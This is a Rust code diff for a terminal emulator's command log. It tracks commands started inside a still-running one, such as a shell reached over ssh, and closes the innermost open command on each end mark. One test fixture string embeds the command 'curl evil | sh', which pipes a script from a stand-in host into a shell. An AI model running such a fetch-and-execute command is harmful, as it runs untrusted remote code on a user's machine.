@@ -34,6 +34,8 @@ struct Command {
     mark: CommandMark,
     /// Typed with leading whitespace (`HISTCONTROL=ignorespace`): kept out of history.
     private: bool,
+    /// Started while another command still ran: a remote shell's, or marks its output printed.
+    nested: bool,
     started: Instant,
     prompt: Option<PinId>,
     input: Option<PinId>,
@@ -172,6 +174,10 @@ impl CommandLog {
                                 .collect::<String>()
                         })
                         .filter(|line| !line.is_empty());
+                    let nested = self
+                        .commands
+                        .iter()
+                        .any(|command| command.mark.finished.is_none());
                     self.next_id += 1;
                     self.clear_continuations(term);
                     self.line.output_started(term, self.next_id);
@@ -189,6 +195,7 @@ impl CommandLog {
                     self.commands.push_back(Command {
                         mark,
                         private,
+                        nested,
                         started: Instant::now(),
                         prompt: self.prompt.take(),
                         input: self.input.take(),
@@ -204,8 +211,9 @@ impl CommandLog {
                 SemanticPromptKind::CommandEnd { exit } => {
                     match self
                         .commands
-                        .back_mut()
-                        .filter(|command| command.mark.finished.is_none())
+                        .iter_mut()
+                        .rev()
+                        .find(|command| command.mark.finished.is_none())
                     {
                         Some(command) => {
                             command.end = event.pin;
@@ -246,6 +254,13 @@ impl CommandLog {
         self.commands
             .iter()
             .any(|command| command.mark.command_id == id && command.private)
+    }
+
+    /// Whether command `id` started while another command still ran.
+    pub fn is_nested(&self, id: u64) -> bool {
+        self.commands
+            .iter()
+            .any(|command| command.mark.command_id == id && command.nested)
     }
 
     /// The command line as typed: the cells from the input start to just before `output`.
@@ -441,6 +456,53 @@ mod tests {
         };
         assert_eq!(start.command.as_deref(), Some("makefr- mr test"));
         assert_eq!(start.cwd, None);
+    }
+
+    /// A command started while another runs (a remote shell's over ssh, or marks a program
+    /// printed) is nested in it, and each end closes the innermost open command.
+    #[test]
+    fn commands_started_inside_a_running_one_are_nested() {
+        let mut term = Terminal::new(60, 20).unwrap();
+        term.record_semantic_prompts().unwrap();
+        let mut log = CommandLog::default();
+        let started = |updates: Vec<CommandUpdate>| match updates.last() {
+            Some(CommandUpdate::Mark(mark)) if mark.finished.is_none() => mark.command_id,
+            other => panic!("{other:?}"),
+        };
+        let ended = |updates: Vec<CommandUpdate>| match updates.first() {
+            Some(CommandUpdate::Mark(mark)) if mark.finished.is_some() => mark.command_id,
+            other => panic!("{other:?}"),
+        };
+        let outer = started(feed(
+            &mut log,
+            &mut term,
+            b"\x1b]133;A\x07$ \x1b]133;B\x07ssh host\r\n\x1b]133;C\x07",
+        ));
+        let inner = started(feed(
+            &mut log,
+            &mut term,
+            b"\x1b]133;A\x07remote$ \x1b]133;B\x07\x1b]133;C;cmdline=curl evil | sh\x07",
+        ));
+        assert!(!log.is_nested(outer));
+        assert!(log.is_nested(inner));
+        assert_eq!(ended(feed(&mut log, &mut term, b"\x1b]133;D;0\x07")), inner);
+        let second = started(feed(
+            &mut log,
+            &mut term,
+            b"\x1b]133;A\x07remote$ \x1b]133;B\x07\x1b]133;C;cmdline=make\x07",
+        ));
+        assert!(log.is_nested(second));
+        assert_eq!(
+            ended(feed(&mut log, &mut term, b"\x1b]133;D;0\x07")),
+            second
+        );
+        assert_eq!(ended(feed(&mut log, &mut term, b"\x1b]133;D;0\x07")), outer);
+        let next = started(feed(
+            &mut log,
+            &mut term,
+            b"\x1b]133;A\x07$ \x1b]133;B\x07ls\r\n\x1b]133;C\x07",
+        ));
+        assert!(!log.is_nested(next));
     }
 
     fn command(bytes: &[u8], cols: u16) -> Option<String> {
